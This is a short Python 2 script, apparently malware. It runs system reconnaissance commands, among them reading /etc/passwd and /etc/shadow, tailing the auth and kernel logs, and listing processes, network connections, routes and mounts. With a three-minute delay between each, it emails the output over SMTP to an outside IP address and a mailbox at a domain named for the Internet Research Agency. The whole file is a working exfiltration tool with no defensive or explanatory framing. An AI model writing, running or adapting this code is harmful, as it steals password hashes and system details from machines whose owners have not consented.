#!/usr/bin/env python2

import smtplib
import subprocess
import time
import string

address = '217.28.100.1' #'mail.current.ops.drive@internetresearchagency.ru'
from_string = 'usr_AA_0301' 
to_string = 'AA.drive.bots@internetresearchagency.ru'
msg_string = "From: {}\r\nTo: {}\r\n\r\n{}\r\n"

args = [
	['cat','/etc/passwd'],
	['cat','/etc/shadow'],
	['cat','/etc/hosts'],
	['tail','-40','/var/log/kern.log'],
	['tail','-40','/var/log/auth.log'],
	['lastlog'],
	['ps','-aux'],
	['netstat','-tul'],
	['route'],
	['mount'],
]


def main():
    for arg in args:
	time.sleep(60 * 3)
	output = subprocess.check_output(arg)

	server = smtplib.SMTP(address)
	msg = msg_string.format(from_string, to_string, output)
	server.sendmail(from_string, to_string, msg)
	server.quit()


if __name__ == '__main__':
    main()

